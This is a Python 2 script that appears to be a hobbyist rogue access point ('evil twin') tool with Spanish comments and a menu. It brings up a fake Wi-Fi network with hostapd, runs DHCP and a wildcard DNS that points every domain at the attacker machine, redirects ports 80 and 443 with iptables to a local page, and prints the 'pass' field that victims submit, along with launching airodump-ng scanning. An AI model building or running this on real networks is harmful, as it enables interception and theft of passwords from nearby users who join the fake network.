#!/usr/bin/python
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from os import curdir, sep
import cgi,os,sys,time
from subprocess import Popen, PIPE, check_output
import socket

PORT_NUMBER = 8080
ssl_port = 443
IP = "192.168.0.1"
ips = "192.168.0"
DHCP_LEASE = "192.168.0.2,192.168.0.254,12h"
RANG_IP = ips
DUMP_PATH = "/root/Desktop/jr"

interface = "wlan0"
Host_SSID = "Roque"
Host_CHAN = "6"
DN = open(os.devnull, 'w')

W = '\033[0m'    # white (normal)
R = '\033[31m'   # red
G = '\033[32m'   # green
O = '\033[33m'   # orange
B = '\033[34m'   # blue
P = '\033[35m'   # purple
C = '\033[36m'   # cyan
GR = '\033[37m'  # gray
T = '\033[93m'   # tan

#This class will handles any incoming request from
#the browser 
class myHandler(BaseHTTPRequestHandler):
    #Handler for the GET requests
    def do_GET(self):
        print "pide algo"
        """
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        #Send the html message
        self.wfile.write("Hello World !")
        """
        if self.path=="/":
            self.path="/index.html"
        if self.path.endswith(".html"):
            mimetype='text/html'
            sendReply = True
        if self.path.endswith(".ico"):
            mimetype='image/x-icon'
            sendReply = True

        f = open(curdir + sep + self.path) 
        self.send_response(200)
        self.send_header('Content-type',mimetype)
        self.end_headers()
        self.wfile.write(f.read())
        f.close()        
        return
    
    def do_POST(self):
        if self.path=="/":
            self.path="/index.html"
            mimetype='text/html'      
        form = cgi.FieldStorage(fp=self.rfile,headers=self.headers,environ={'REQUEST_METHOD':'POST','CONTENT_TYPE':self.headers['Content-Type'],})
        print "Your name is: %s" % form["pass"].value
        #self.send_response(200)
        #self.send_header('Content-type',mimetype)
        #self.end_headers()
        self.send_response(200)
        self.end_headers()
        self.wfile.write("Thanks %s !" % form["pass"].value)        
        return

class Forwaid:
    def conf(self):        
        os.system('ifconfig %s down' % interface)
        os.system('ifconfig %s %s netmask 255.255.255.0' %(interface,IP))        
        os.system('ifconfig %s up' % interface)
        
        os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
        os.system('route add -net '+RANG_IP+'.0 netmask 255.255.255.0 gw %s'%IP)
        
        os.system('iptables --flush')
        os.system('iptables --table nat --flush')
        os.system('iptables --delete-chain')
        os.system('iptables --table nat --delete-chain')
        os.system('iptables -P FORWARD ACCEPT')
        os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:80'%IP)
        os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s'%(IP,ssl_port))
        os.system('iptables -t nat -A POSTROUTING -j MASQUERADE')        
        #xterm $HOLD -title "Escaneando Objetivos en el canal -->  $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w -a wlan0
        
    def detenerservicion(self):
        os.system('killall hostapd')        
        os.system('killall aireplay-ng')
        os.system('killall airodump-ng')
        os.system('killall lighttpd')
        os.system('killall dhcpd')
        os.system('killall mdk3')
        #os.system('service stop networkmanager')
        #os.system('airmon-ng stop '+interface)
        os.system('pkill mdk3')
        os.system('pkill dhcpd')
        os.system('pkill airodump-ng')
        os.system('pkill aireplay-ng')
        os.system('pkill dnsmasq')
        os.system('pkill hostapd')
        os.system('pkill lighttpd')
        os.system('killall -9 dnsmasq')              
        Popen(['airmon-ng','stop', interface], stdout=DN, stderr=DN)         
        Popen(['service','stop', 'networkmanager'], stdout=DN, stderr=DN)
        os.system('echo "0" > /proc/sys/net/ipv4/ip_forward')        
        
    def borrarconf(self):
        os.system('echo "0" > /proc/sys/net/ipv4/ip_forward')
        os.system('iptables --flush')
        os.system('iptables --table nat --flush')
        os.system('iptables --delete-chain')
        os.system('iptables --table nat --delete-chain')
        
    def reiniciar(self):
        #os.system('service restart networkmanager')
        os.system('killall xterm')        
        
    def confFakeapydhcp(self):        
        #forma 2
        configAp = (
        'interface=%s\n'
        'driver=nl80211\n'
        'ssid=%s\n'
        'hw_mode=g\n'
        'channel=%s\n'
        'macaddr_acl=0\n'
        'ignore_broadcast_ssid=0\n'
        )        
       
        configDhcp2 = (
         'authoritative;\n' 
         'default-lease-time 600;\n'
         'max-lease-time 7200;\n'         
         'subnet '+RANG_IP+'.0 netmask 255.255.255.0 {\n'
         'option broadcast-address '+RANG_IP+'.255;\n'
         'option routers '+IP+';\n'
         'option subnet-mask 255.255.255.0;\n'
         'option domain-name-servers '+IP+';\n'
         'range '+RANG_IP+'.100 '+RANG_IP+'.250;\n'         
         '}'
        )   
        
        with open(DUMP_PATH+'/hostapd.conf', 'w') as apconf:
            apconf.write(configAp % (interface, Host_SSID, Host_CHAN))
            
        with open(DUMP_PATH+'/dhcpd.conf', 'w') as dhcpconf:           
            dhcpconf.write(configDhcp2)

        #Forma1
        """
        #Se crear el hostaapd config de ap falso        
        os.system('echo "interface=wlan0\ndriver=nl80211\nssid=Rogue\nchannel=1">'+DUMP_PATH+'/hostapd.conf')        
        #os.system('echo "interface=%s driver=nl80211 ssid=%s channel=%s" > %s/hostapd.conf'%(interface,Host_SSID,Host_CHAN,DUMP_PATH))        
        # Se crea el config del servidor DHCP        
        os.system('echo "authoritative; default-lease-time 600; max-lease-time 7200; subnet '+RANG_IP+'.0 netmask 255.255.255.0 {option broadcast-address '+RANG_IP+'.255;option routers '+IP+';option subnet-mask 255.255.255.0; option domain-name-servers '+IP+';range '+RANG_IP+'.100 '+RANG_IP+'.250;}" > '+DUMP_PATH+'/dhcpd.conf')  
        """
        
    def Dns(self):
        
        config = (
        'no-resolv\n'
        'interface=%s\n'
        'dhcp-range=%s\n'
        'address=/#/%s'
        )        
        with open(''+DUMP_PATH+'/dns.conf', 'w') as dhcpconf:
            dhcpconf.write(config % (interface, DHCP_LEASE, IP))
            
        path = DUMP_PATH+'/dns.conf'
        os.system('echo > /var/lib/misc/dnsmasq.leases')            
            
        #dns = Popen(['xterm','-e','dnsmasq', '-C', path], stdout=PIPE, stderr=DN)
        #return DUMP_PATH+'/dns.conf'
        
    def escaner(self):
        os.system('airmon-ng start %s'%interface)
        os.system('xterm -title "Escaneando Objetivos ..." -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w %s/dump -a mon0'%DUMP_PATH)
            
    def crearFakeAp(self):
        self.detenerservicion()
        self.conf()
        self.confFakeapydhcp()
        #self.Dns()
        #os.system('xterm -geometry 90x20-0-0 -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd '+DUMP_PATH+'/hostapd.conf')
        #os.system('xterm -bg black -fg green -geometry 100x17+50+50 -T DHCP -e "dhcpd -d -f -cf "'+DUMP_PATH+'/dhcpd.conf" wlan0 2>&1 | tee -a '+DUMP_PATH+'/clientes.txt"')
       
        #Creo el Ap falso
        Popen(['xterm','-e', 'hostapd', ''+DUMP_PATH+'/hostapd.conf'], stdout=DN, stderr=DN)
        try:
            time.sleep(6)  # Copied from Pwnstar which said it was necessary?
        except KeyboardInterrupt:
            print "keyboar"       
        #Popen(['xterm','-e', 'dhcpd','-d','-f','-cf' ,'/root/Desktop/jr/dhcpd.conf','wlan0'], stdout=DN, stderr=DN)
                 
        #Creo el Dhcp y dns
        Popen(['xterm','-e','dnsmasq', '-C', ''+DUMP_PATH+'/dns.conf','--no-daemon','--log-queries'], stdout=PIPE, stderr=DN)
        #Creo el Lihttp
        os.system('lighttpd -f '+DUMP_PATH+'/liphp2.conf')
        #dnsmasq -C /root/Desktop/jr/dns.conf --no-daemon --log-queries


    def creaFakeApF2(self):
        self.detenerservicion()
        self.conf()
        self.confFakeapydhcp()

        #Creo Fake Ap
        Popen(['xterm','-e', 'hostapd', ''+DUMP_PATH+'/hostapd.conf'], stdout=DN, stderr=DN)
        try:
            time.sleep(6)  # Copied from Pwnstar which said it was necessary?
        except KeyboardInterrupt:
            print "keyboar"
        #Creo Dhcp
        Popen(['xterm','-e', 'dhcpd','-d','-f','-cf' ,'/root/Desktop/jr/dhcpd.conf','wlan0'], stdout=DN, stderr=DN)
        #Creo Lihhtpd
        os.system('lighttpd -f '+DUMP_PATH+'/liphp2.conf')



class modulosparaIntall:    
    def get_hostapd(self):
        if not os.path.isfile('/usr/sbin/hostapd'):
            install = raw_input(
                ('[' + T + '*' + W + '] hostapd not found ' +
                'in /usr/sbin/hostapd, install now? [y/n] ')
            )
            if install == 'y':
                os.system('apt-get -y install hostapd')
            else:
                sys.exit(('[' + R + '-' + W + '] hostapd' +
                        'not found in /usr/sbin/hostapd'))
        else:
            print G+'[+]'+W+' Instalado Hospad'


def inic():   
    print G+'By JR'+W   
    print '---------------'  
    print G+'1)'+W+' Server simple'
    print G+'2)'+W+' configurar routes'
    print G+'3)'+W+' configurar iptables'
    print G+'4)'+W+' borrar configuraciones'
    print G+'5)'+W+' Crear fake ap'
    print G+'10)'+W+' Salir'
    print G+'11)'+W+' pruebas'
    modulosparaIntall().get_hostapd()
    try:
        hola = raw_input("Seleciona options>: ")
    except KeyboardInterrupt:
	Forwaid().detenerservicion()
	Forwaid().borrarconf()
        os.system("clear")
        sys.exit()
    if hola == "1":
        try:
            server = HTTPServer(('192.168.0.104', PORT_NUMBER), myHandler)
            print 'Started httpserver on port ' , PORT_NUMBER
            server.serve_forever()
        except KeyboardInterrupt:
            print '^C received, shutting down the web server'
            server.socket.close()
    elif hola == "2":
        get_hostapd()
    elif hola == "3":
        vamos = Forwaid()
        vamos.conf()       
        vamos.crearWifi()
    elif hola == "4":
        vamos = Forwaid()
        vamos.borrarconf()
    elif hola == "5":
        Forwaid().crearFakeAp()
    elif hola == "6":
        Forwaid().creaFakeApF2()
    elif hola == "10":
        vamos = Forwaid()
        vamos.borrarconf()
        vamos.detenerservicion()
        vamos.reiniciar()
        sys.exit()
    elif hola == "11":
        Forwaid().confFakeapydhcp()
    
    inic()


if __name__ == "__main__":
    #while True:
    inic()
    
    
      
        


 
